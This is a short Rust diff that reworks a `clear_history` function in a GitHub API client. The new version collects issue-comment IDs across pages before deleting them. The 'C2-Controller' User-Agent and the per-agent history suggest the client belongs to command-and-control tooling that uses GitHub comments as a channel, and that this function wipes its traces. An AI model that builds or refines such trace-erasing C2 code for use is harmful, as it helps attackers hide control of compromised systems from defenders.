@@ -154,6 +154,7 @@ impl GitHubClient {
     }
 
     pub fn clear_history(&self, agent_id: &str) -> Result<(), String> {
+        let mut comment_ids = Vec::new();
         let mut page = 1;
 
         loop {
@@ -171,24 +172,25 @@ impl GitHubClient {
 
             let comments: Vec<Comment> = response.json().map_err(|e| e.to_string())?;
             let count = comments.len();
-
-            for comment in &comments {
-                let delete_url = format!(
-                    "https://api.github.com/repos/{}/issues/comments/{}",
-                    self.repo, comment.id
-                );
-                let _ = self
-                    .client
-                    .delete(&delete_url)
-                    .header("Authorization", format!("token {}", self.token))
-                    .header("User-Agent", "C2-Controller")
-                    .send();
-            }
+            comment_ids.extend(comments.into_iter().map(|comment| comment.id));
 
             if count < 100 {
                 break;
             }
             page += 1;
+        }
+
+        for comment_id in comment_ids {
+            let delete_url = format!(
+                "https://api.github.com/repos/{}/issues/comments/{}",
+                self.repo, comment_id
+            );
+            let _ = self
+                .client
+                .delete(&delete_url)
+                .header("Authorization", format!("token {}", self.token))
+                .header("User-Agent", "C2-Controller")
+                .send();
         }
 
         Ok(())
